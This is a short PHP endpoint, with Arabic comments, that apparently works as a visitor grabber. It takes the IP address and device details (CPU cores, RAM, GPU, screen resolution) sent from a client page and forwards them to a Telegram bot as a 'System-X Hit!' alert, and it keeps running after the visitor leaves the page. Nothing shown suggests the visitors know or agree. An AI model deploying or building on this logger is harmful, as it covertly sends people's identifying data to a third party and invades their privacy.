<?php
ignore_user_abort(true); // استمر في العمل حتى لو العميل أغلق الصفحة
set_time_limit(10); 

require_once 'config.php';
require_once 'telegram.php';

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if ($d) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];

    // بناء الرسالة بشكل مختصر لتجنب أي مشاكل في الإرسال
    $msg = "⚡ <b>System-X Hit!</b>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "🌐 <b>IP:</b> <code>$ip</code>\n";
    $msg .= "📱 <b>Device:</b> <code>" . ($d['cores'] ?? '0') . " Cores | " . ($d['ram'] ?? '0') . "GB RAM</code>\n";
    $msg .= "🖥️ <b>GPU:</b> <code>" . ($d['vendor'] ?? 'N/A') . "</code>\n";
    $msg .= "📏 <b>Res:</b> <code>" . ($d['res'] ?? 'N/A') . "</code>\n";
    $msg .= "━━━━━━━━━━━━━━\n";
    $msg .= "👨‍💻 <b>Dev: @" . DEV_USERNAME . "</b>";

    sendTelegramMessage($msg);
}
?>
